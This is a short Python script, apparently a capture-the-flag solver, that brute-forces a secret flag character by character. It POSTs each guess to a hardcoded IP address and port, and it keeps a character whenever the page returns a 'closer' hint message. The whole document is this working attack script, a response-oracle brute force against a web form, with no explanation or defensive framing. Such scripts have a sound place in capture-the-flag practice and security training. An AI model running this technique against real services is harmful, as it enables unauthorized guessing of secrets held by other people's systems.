import requests
import string


#alphabet = string.printable
alphabet = string.printable[10:]+string.printable[:10]

url = 'http://167.99.129.209:7788/index.php'

check_string = 'Hey, you are a bit close than before!'
fail = 'Sorry, wrong flag!'

flag = ''
i = 0
while True:
	i = i + 1
	for a in alphabet:
		try:
			data = { 'flag' : flag+a }
			re = requests.post(url,data=data)

			if check_string in re.text:
				flag = flag+a
				print(f'Iteration: {i} Next: {flag}')
		
		except KeyboardInterrupt as k:
			print('exit')
			raise k
		except Exception:
			pass
